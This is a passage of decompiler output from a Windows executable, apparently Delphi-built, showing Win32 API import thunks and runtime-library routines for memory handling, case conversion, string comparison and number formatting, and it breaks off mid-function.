BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ecc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindNextFileA(hFindFile,lpFindFileData);
  return BVar1;
}



DWORD __stdcall
FormatMessageA(DWORD dwFlags,LPCVOID lpSource,DWORD dwMessageId,DWORD dwLanguageId,LPSTR lpBuffer,
              DWORD nSize,va_list *Arguments)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ed4. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = FormatMessageA(dwFlags,lpSource,dwMessageId,dwLanguageId,lpBuffer,nSize,Arguments);
  return DVar1;
}



UINT __stdcall GetACP(void)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405edc. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetACP();
  return UVar1;
}



BOOL __stdcall GetCPInfo(UINT CodePage,LPCPINFO lpCPInfo)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ee4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetCPInfo(CodePage,lpCPInfo);
  return BVar1;
}



DWORD __stdcall GetCurrentThreadId(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405eec. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentThreadId();
  return DVar1;
}



int __stdcall
GetDateFormatA(LCID Locale,DWORD dwFlags,SYSTEMTIME *lpDate,LPCSTR lpFormat,LPSTR lpDateStr,
              int cchDate)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ef4. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetDateFormatA(Locale,dwFlags,lpDate,lpFormat,lpDateStr,cchDate);
  return iVar1;
}



BOOL __stdcall
GetDiskFreeSpaceA(LPCSTR lpRootPathName,LPDWORD lpSectorsPerCluster,LPDWORD lpBytesPerSector,
                 LPDWORD lpNumberOfFreeClusters,LPDWORD lpTotalNumberOfClusters)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405efc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetDiskFreeSpaceA(lpRootPathName,lpSectorsPerCluster,lpBytesPerSector,
                            lpNumberOfFreeClusters,lpTotalNumberOfClusters);
  return BVar1;
}



DWORD __stdcall GetEnvironmentVariableA(LPCSTR lpName,LPSTR lpBuffer,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f04. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetEnvironmentVariableA(lpName,lpBuffer,nSize);
  return DVar1;
}



DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f0c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileAttributesA(lpFileName);
  return DVar1;
}



DWORD __stdcall
GetFullPathNameA(LPCSTR lpFileName,DWORD nBufferLength,LPSTR lpBuffer,LPSTR *lpFilePart)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f14. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFullPathNameA(lpFileName,nBufferLength,lpBuffer,lpFilePart);
  return DVar1;
}



DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f1c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)

{
                    // WARNING: Could not recover jumptable at 0x00405f24. Too many branches
                    // WARNING: Treating indirect jump as call
  GetLocalTime(lpSystemTime);
  return;
}



int __stdcall GetLocaleInfoA(LCID Locale,LCTYPE LCType,LPSTR lpLCData,int cchData)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f2c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetLocaleInfoA(Locale,LCType,lpLCData,cchData);
  return iVar1;
}



DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f34. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}



HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f3c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f44. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = GetProcAddress(hModule,lpProcName);
  return pFVar1;
}



DWORD __stdcall GetShortPathNameA(LPCSTR lpszLongPath,LPSTR lpszShortPath,DWORD cchBuffer)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f4c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetShortPathNameA(lpszLongPath,lpszShortPath,cchBuffer);
  return DVar1;
}



HANDLE __stdcall GetStdHandle(DWORD nStdHandle)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f54. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GetStdHandle(nStdHandle);
  return pvVar1;
}



BOOL __stdcall
GetStringTypeExA(LCID Locale,DWORD dwInfoType,LPCSTR lpSrcStr,int cchSrc,LPWORD lpCharType)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f5c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetStringTypeExA(Locale,dwInfoType,lpSrcStr,cchSrc,lpCharType);
  return BVar1;
}



LCID __stdcall GetThreadLocale(void)

{
  LCID LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f64. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = GetThreadLocale();
  return LVar1;
}



BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f6c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetVersionExA(lpVersionInformation);
  return BVar1;
}



HGLOBAL __stdcall GlobalAlloc(UINT uFlags,SIZE_T dwBytes)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f74. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GlobalAlloc(uFlags,dwBytes);
  return pvVar1;
}



HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f7c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GlobalFree(hMem);
  return pvVar1;
}



LPVOID __stdcall GlobalLock(HGLOBAL hMem)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f84. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GlobalLock(hMem);
  return pvVar1;
}



HGLOBAL __stdcall GlobalHandle(LPCVOID pMem)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f8c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GlobalHandle(pMem);
  return pvVar1;
}



HGLOBAL __stdcall GlobalReAlloc(HGLOBAL hMem,SIZE_T dwBytes,UINT uFlags)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f94. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GlobalReAlloc(hMem,dwBytes,uFlags);
  return pvVar1;
}



BOOL __stdcall GlobalUnlock(HGLOBAL hMem)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405f9c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GlobalUnlock(hMem);
  return BVar1;
}



void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00405fa4. Too many branches
                    // WARNING: Treating indirect jump as call
  InitializeCriticalSection(lpCriticalSection);
  return;
}



void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00405fac. Too many branches
                    // WARNING: Treating indirect jump as call
  LeaveCriticalSection(lpCriticalSection);
  return;
}



BOOL __stdcall MoveFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fb4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = MoveFileA(lpExistingFileName,lpNewFileName);
  return BVar1;
}



HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwProcessId)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fbc. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = OpenProcess(dwDesiredAccess,bInheritHandle,dwProcessId);
  return pvVar1;
}



BOOL __stdcall
ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fc4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
  return BVar1;
}



BOOL __stdcall ResetEvent(HANDLE hEvent)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fcc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ResetEvent(hEvent);
  return BVar1;
}



BOOL __stdcall SetCurrentDirectoryA(LPCSTR lpPathName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fd4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetCurrentDirectoryA(lpPathName);
  return BVar1;
}



BOOL __stdcall SetEndOfFile(HANDLE hFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fdc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEndOfFile(hFile);
  return BVar1;
}



BOOL __stdcall SetEvent(HANDLE hEvent)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fe4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEvent(hEvent);
  return BVar1;
}



DWORD __stdcall
SetFilePointer(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405fec. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = SetFilePointer(hFile,lDistanceToMove,lpDistanceToMoveHigh,dwMoveMethod);
  return DVar1;
}



BOOL __stdcall TerminateProcess(HANDLE hProcess,UINT uExitCode)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ff4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TerminateProcess(hProcess,uExitCode);
  return BVar1;
}



SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)

{
  SIZE_T SVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ffc. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = VirtualQuery(lpAddress,lpBuffer,dwLength);
  return SVar1;
}



DWORD __stdcall WaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406004. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = WaitForSingleObject(hHandle,dwMilliseconds);
  return DVar1;
}



UINT __stdcall WinExec(LPCSTR lpCmdLine,UINT uCmdShow)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040600c. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = WinExec(lpCmdLine,uCmdShow);
  return UVar1;
}



BOOL __stdcall
WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,
         LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406014. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = WriteFile(hFile,lpBuffer,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
  return BVar1;
}



BOOL __stdcall CharToOemA(LPCSTR pSrc,LPSTR pDst)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040601c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CharToOemA(pSrc,pDst);
  return BVar1;
}



LPSTR __stdcall CharNextA(LPCSTR lpsz)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406024. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = CharNextA(lpsz);
  return pCVar1;
}



BOOL __stdcall CharToOemA(LPCSTR pSrc,LPSTR pDst)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040602c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CharToOemA(pSrc,pDst);
  return BVar1;
}



LRESULT __stdcall DispatchMessageA(MSG *lpMsg)

{
  LRESULT LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406034. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = DispatchMessageA(lpMsg);
  return LVar1;
}



int __stdcall GetSystemMetrics(int nIndex)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040603c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetSystemMetrics(nIndex);
  return iVar1;
}



int __stdcall LoadStringA(HINSTANCE hInstance,UINT uID,LPSTR lpBuffer,int cchBufferMax)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406044. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = LoadStringA(hInstance,uID,lpBuffer,cchBufferMax);
  return iVar1;
}



int __stdcall MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040604c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA(hWnd,lpText,lpCaption,uType);
  return iVar1;
}



BOOL __stdcall
PeekMessageA(LPMSG lpMsg,HWND hWnd,UINT wMsgFilterMin,UINT wMsgFilterMax,UINT wRemoveMsg)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406054. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = PeekMessageA(lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax,wRemoveMsg);
  return BVar1;
}



void __stdcall PostQuitMessage(int nExitCode)

{
                    // WARNING: Could not recover jumptable at 0x0040605c. Too many branches
                    // WARNING: Treating indirect jump as call
  PostQuitMessage(nExitCode);
  return;
}



BOOL __stdcall TranslateMessage(MSG *lpMsg)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406064. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TranslateMessage(lpMsg);
  return BVar1;
}



void FUN_0040606c(undefined4 *param_1,uint param_2)

{
  FUN_00402e48(param_1,param_2,0);
  return;
}



void FUN_00406074(UINT param_1,SIZE_T param_2)

{
  HGLOBAL hMem;
  
  hMem = GlobalAlloc(param_1,param_2);
  GlobalLock(hMem);
  return;
}



void FUN_00406084(LPCVOID param_1,SIZE_T param_2,UINT param_3)

{
  HGLOBAL pvVar1;
  
  pvVar1 = GlobalHandle(param_1);
  GlobalUnlock(pvVar1);
  pvVar1 = GlobalReAlloc(pvVar1,param_2,param_3);
  GlobalLock(pvVar1);
  return;
}



void FUN_004060a0(LPCVOID param_1)

{
  HGLOBAL hMem;
  
  hMem = GlobalHandle(param_1);
  GlobalUnlock(hMem);
  GlobalFree(hMem);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004060b4(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack_10 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack_10;
  _DAT_00419670 = _DAT_00419670 + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



void FUN_00406fd0(uint param_1,uint param_2,undefined2 *param_3,undefined2 *param_4)

{
  *param_3 = (short)(param_1 / (param_2 & 0xffff));
  *param_4 = (short)(param_1 % (param_2 & 0xffff));
  return;
}



void FUN_00406fec(int **param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040a9b4((int *)PTR_DAT_00406a38,'\x01',param_1);
  FUN_00403abc((int)piVar1);
  return;
}



void FUN_00407004(int **param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  
  iVar1 = FUN_0040a9f0((int)PTR_DAT_00406a38,'\x01',param_1,param_3,param_2);
  FUN_00403abc(iVar1);
  return;
}



undefined4 * FUN_00407028(uint param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_00402690(param_1);
  FUN_00402e48(puVar1,param_1,0);
  return puVar1;
}



void FUN_00407048(byte *param_1,byte **param_2)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  
  uVar2 = FUN_004042f8((int)param_1);
  FUN_00404628((int *)param_2,uVar2);
  pbVar3 = *param_2;
  for (; uVar2 != 0; uVar2 = uVar2 - 1) {
    bVar1 = *param_1;
    if ((0x60 < bVar1) && (bVar1 < 0x7b)) {
      bVar1 = bVar1 - 0x20;
    }
    *pbVar3 = bVar1;
    param_1 = param_1 + 1;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



void FUN_00407084(byte *param_1,byte **param_2)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  
  uVar2 = FUN_004042f8((int)param_1);
  FUN_00404628((int *)param_2,uVar2);
  pbVar3 = *param_2;
  for (; uVar2 != 0; uVar2 = uVar2 - 1) {
    bVar1 = *param_1;
    if ((0x40 < bVar1) && (bVar1 < 0x5b)) {
      bVar1 = bVar1 + 0x20;
    }
    *pbVar3 = bVar1;
    param_1 = param_1 + 1;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



int FUN_004070c0(char *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  byte bVar6;
  byte bVar7;
  bool bVar8;
  
  pcVar3 = param_1;
  if (param_1 != (char *)0x0) {
    pcVar3 = *(char **)(param_1 + -4);
  }
  pcVar5 = param_2;
  if (param_2 != (char *)0x0) {
    pcVar5 = *(char **)(param_2 + -4);
  }
  pcVar4 = pcVar3;
  if (pcVar5 < pcVar3) {
    pcVar4 = pcVar5;
  }
  bVar8 = true;
LAB_004070df:
  do {
    if (pcVar4 != (char *)0x0) {
      pcVar4 = pcVar4 + -1;
      pcVar2 = param_2 + 1;
      pcVar1 = param_1 + 1;
      bVar8 = *param_1 == *param_2;
      param_1 = pcVar1;
      param_2 = pcVar2;
      if (bVar8) goto LAB_004070df;
    }
    if (bVar8) goto LAB_0040710d;
    bVar6 = param_1[-1];
    if ((0x60 < bVar6) && (bVar6 < 0x7b)) {
      bVar6 = bVar6 - 0x20;
    }
    bVar7 = param_2[-1];
    if ((0x60 < bVar7) && (bVar7 < 0x7b)) {
      bVar7 = bVar7 - 0x20;
    }
    bVar8 = bVar6 == bVar7;
    if (!bVar8) {
      pcVar3 = (char *)(uint)bVar6;
      pcVar5 = (char *)(uint)bVar7;
LAB_0040710d:
      return (int)pcVar3 - (int)pcVar5;
    }
  } while( true );
}



undefined4 FUN_00407114(char *param_1,char *param_2)

{
  if (param_1 != param_2) {
    if (param_1 == (char *)0x0) {
      return 0;
    }
    if ((param_2 == (char *)0x0) || (*(int *)(param_1 + -4) != *(int *)(param_2 + -4))) {
      return 0;
    }
    param_1 = (char *)FUN_004070c0(param_1,param_2);
    if (param_1 != (char *)0x0) {
      return 0;
    }
  }
  return CONCAT31((int3)((uint)param_1 >> 8),1);
}



int FUN_00407138(undefined *param_1,undefined *param_2)

{
  int iVar1;
  PCNZCH lpString2;
  int cchCount1;
  PCNZCH lpString1;
  
  iVar1 = FUN_004042f8((int)param_2);
  lpString2 = FUN_004044f8(param_2);
  cchCount1 = FUN_004042f8((int)param_1);
  lpString1 = FUN_004044f8(param_1);
  iVar1 = CompareStringA(0x400,0,lpString1,cchCount1,lpString2,iVar1);
  return iVar1 + -2;
}



int FUN_00407170(undefined *param_1,undefined *param_2)

{
  int iVar1;
  PCNZCH lpString2;
  int cchCount1;
  PCNZCH lpString1;
  
  iVar1 = FUN_004042f8((int)param_2);
  lpString2 = FUN_004044f8(param_2);
  cchCount1 = FUN_004042f8((int)param_1);
  lpString1 = FUN_004044f8(param_1);
  iVar1 = CompareStringA(0x400,1,lpString1,cchCount1,lpString2,iVar1);
  return iVar1 + -2;
}



bool FUN_004071a8(undefined *param_1,undefined *param_2)

{
  int iVar1;
  
  iVar1 = FUN_00407170(param_1,param_2);
  return iVar1 == 0;
}



void FUN_004071c0(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = FUN_004042f8(param_1);
  for (iVar2 = 1; (iVar2 <= iVar1 && (*(byte *)(param_1 + -1 + iVar2) < 0x21)); iVar2 = iVar2 + 1) {
  }
  if (iVar1 < iVar2) {
    FUN_0040405c(param_2);
  }
  else {
    for (; *(byte *)(param_1 + -1 + iVar1) < 0x21; iVar1 = iVar1 + -1) {
    }
    FUN_00404558(param_1,iVar2,(iVar1 - iVar2) + 1,param_2);
  }
  return;
}



void FUN_00407210(uint param_1,uint param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  byte bVar3;
  int iVar5;
  byte *unaff_ESI;
  byte *pbVar6;
  char cVar4;
  
  pbVar6 = unaff_ESI;
  if ((char)param_3 == '\0') {
    if ((int)param_1 < 0) {
      FUN_00407226(-param_1,param_2);
      unaff_ESI[-1] = 0x2d;
      return;
    }
    param_3 = 10;
  }
  do {
    uVar2 = param_1 / param_3;
    pbVar6 = pbVar6 + -1;
    cVar4 = (char)(param_1 % param_3);
    bVar3 = cVar4 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = cVar4 + 0x37;
    }
    *pbVar6 = bVar3;
    param_1 = uVar2;
  } while (uVar2 != 0);
  iVar5 = param_2 - ((int)unaff_ESI - (int)pbVar6);
  if ((uint)((int)unaff_ESI - (int)pbVar6) <= param_2 && iVar5 != 0) {
    iVar1 = -iVar5;
    while (iVar5 = iVar5 + -1, iVar5 != 0) {
      (pbVar6 + iVar1)[iVar5] = 0x30;
    }
    pbVar6[iVar1] = 0x30;
  }
  return;
}



void FUN_00407226(uint param_1,uint param_2)

{
  ulonglong uVar1;
  int iVar2;
  byte bVar3;
  int iVar5;
  byte *unaff_ESI;
  byte *pbVar6;
  char cVar4;
  
  pbVar6 = unaff_ESI;
  do {
    uVar1 = (ulonglong)param_1;
    param_1 = param_1 / 10;
    pbVar6 = pbVar6 + -1;
    cVar4 = (char)(uVar1 % 10);
    bVar3 = cVar4 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = cVar4 + 0x37;
    }
    *pbVar6 = bVar3;
  } while (param_1 != 0);
  iVar5 = param_2 - ((int)unaff_ESI - (int)pbVar6);
  if ((uint)((int)unaff_ESI - (int)pbVar6) <= param_2 && iVar5 != 0) {
    iVar2 = -iVar5;
    while (iVar5 = iVar5 + -1, iVar5 != 0) {
      (pbVar6 + iVar2)[iVar5] = 0x30;
    }
    pbVar6[iVar2] = 0x30;
  }
  return;
}



void FUN_0040725c(uint param_1,int *param_2)

{
  uint extraout_ECX;
  
  FUN_00407210(param_1,0,0);
  FUN_0040414c(param_2,(undefined4 *)&stack0xfffffffc,extraout_ECX);
  return;
}



void FUN_0040727c(ulonglong *param_1,uint param_2,short param_3)

{
  float10 fVar1;
  int iVar2;
  byte bVar3;
  int iVar4;
  byte *unaff_ESI;
  byte *pbVar5;
  float10 fVar6;
  float10 fVar7;
  float10 fVar8;
  int local_8;
  
  if (((char)param_3 == '\0') && (param_3 = 10, (*(uint *)((int)param_1 + 4) & 0x80000000) != 0)) {
    local_8 = -*(int *)param_1;
    FUN_004072b0((ulonglong *)&local_8,param_2,10);
    unaff_ESI[-1] = 0x2d;
    return;
  }
  fVar1 = (float10)1;
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) == 0) {
    fVar8 = (float10)*param_1;
  }
  else {
    fVar8 = (float10)0x7fffffffffffffff + fVar1 + (float10)(*param_1 & 0x7fffffffffffffff);
  }
  fVar6 = (float10)param_3;
  pbVar5 = unaff_ESI;
  do {
    pbVar5 = pbVar5 + -1;
    fVar7 = fVar8 - (fVar8 / fVar6) * fVar6;
    fVar8 = fVar8 / fVar6;
    local_8._0_1_ = (char)(short)ROUND(fVar7);
    bVar3 = (char)local_8 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = (char)local_8 + 0x37;
    }
    *pbVar5 = bVar3;
  } while (fVar1 <= fVar8);
  ffree(fVar1);
  ffree(fVar8);
  ffree(fVar6);
  ffree(fVar8);
  iVar4 = param_2 - ((int)unaff_ESI - (int)pbVar5);
  if ((uint)((int)unaff_ESI - (int)pbVar5) <= param_2 && iVar4 != 0) {
    iVar2 = -iVar4;
    while (iVar4 = iVar4 + -1, iVar4 != 0) {
      (pbVar5 + iVar2)[iVar4] = 0x30;
    }
    pbVar5[iVar2] = 0x30;
  }
  return;
}



void FUN_004072b0(ulonglong *param_1,uint param_2,short param_3)

{
  float10 fVar1;
  int iVar2;
  byte bVar3;
  int iVar4;
  byte *unaff_ESI;
  byte *pbVar5;
  float10 fVar6;
  float10 fVar7;
  float10 fVar8;
  char local_8;
  
  fVar1 = (float10)1;
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) == 0) {
    fVar8 = (float10)*param_1;
  }
  else {
    fVar8 = (float10)0x7fffffffffffffff + fVar1 + (float10)(*param_1 & 0x7fffffffffffffff);
  }
  fVar6 = (float10)param_3;
  pbVar5 = unaff_ESI;
  do {
    pbVar5 = pbVar5 + -1;
    fVar7 = fVar8 - (fVar8 / fVar6) * fVar6;
    fVar8 = fVar8 / fVar6;
    local_8 = (char)(short)ROUND(fVar7);
    bVar3 = local_8 + 0x30;
    if (0x39 < bVar3) {
      bVar3 = local_8 + 0x37;
    }
    *pbVar5 = bVar3;
  } while (fVar1 <= fVar8);
  ffree(fVar1);
  ffree(fVar8);
  ffree(fVar6);
  ffree(fVar8);
  iVar4 = param_2 - ((int)unaff_ESI - (int)pbVar5);
  if ((uint)((int)unaff_ESI - (int)pbVar5) <= param_2 && iVar4 != 0) {
    iVar2 = -iVar4;
    while (iVar4 = iVar4 + -1, iVar4 != 0) {
      (pbVar5 + iVar2)[iVar4] = 0x30;
    }
    pbVar5[iVar2] = 0x30;
  }
  return;
}



void FUN_00407348(int *param_1,undefined param_2,undefined param_3,undefined param_4)

{
  uint extraout_ECX;
  
  FUN_0040727c((ulonglong *)&param_4,0,0);
  FUN_0040414c(param_1,(undefined4 *)&stack0xfffffff8,extraout_ECX);
  return;
}



void FUN_00407370(uint param_1,uint param_2,int *param_3)

{
  uint extraout_ECX;
  
  if (0x20 < param_2) {
    param_2 = 0;
  }
  FUN_00407210(param_1,param_2,0x10);
  FUN_0040414c(param_3,(undefined4 *)&stack0xfffffffc,extraout_ECX);
  return;
}



byte * FUN_00407398(byte *param_1,byte *param_2,int param_3)

{
  byte *pbVar1;
  int local_8;
  
  local_8 = param_3;
  pbVar1 = FUN_00402ee0(param_1,&local_8);
  if (local_8 != 0) {
    pbVar1 = param_2;
  }
  return pbVar1;
}



bool FUN_004073b0(byte *param_1,byte **param_2,int param_3)

{
  byte *pbVar1;
  int local_c;
  
  local_c = param_3;
  pbVar1 = FUN_00402ee0(param_1,&local_c);
  *param_2 = pbVar1;
  return local_c == 0;
}



void FUN_004073d0(void)

{
  int iVar1;
  
  iVar1 = FUN_00404dcc((int)DAT_00419780);
  if (iVar1 == 0) {
    FUN_00404f88(&DAT_00419780,(int)PTR_DAT_00406e2c,1);
    FUN_004040b0(DAT_00419780,(undefined4 *)&DAT_00407448);
  }
  iVar1 = FUN_00404dcc((int)DAT_00419784);
  if (iVar1 == 0) {
    FUN_00404f88(&DAT_00419784,(int)PTR_DAT_00406e50,1);
    FUN_004040b0(DAT_00419784,(undefined4 *)s_False_00407458);
  }
  return;
}



undefined FUN_00407460(undefined4 *param_1,int param_2,undefined4 param_3,int param_4)

{
  bool bVar1;
  int iVar2;
  
  if (-1 < param_2) {
    iVar2 = param_2 + 1;
    do {
      bVar1 = FUN_004071a8(*(undefined **)(param_4 + -4),(undefined *)*param_1);
      if (bVar1) {
        return 1;
      }
      param_1 = param_1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040749c(undefined *param_1,undefined *param_2)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined *puVar3;
  undefined *puVar4;
  float10 local_14;
  undefined *local_8;
  
  puVar3 = &stack0xfffffffc;
  puVar4 = &stack0xfffffffc;
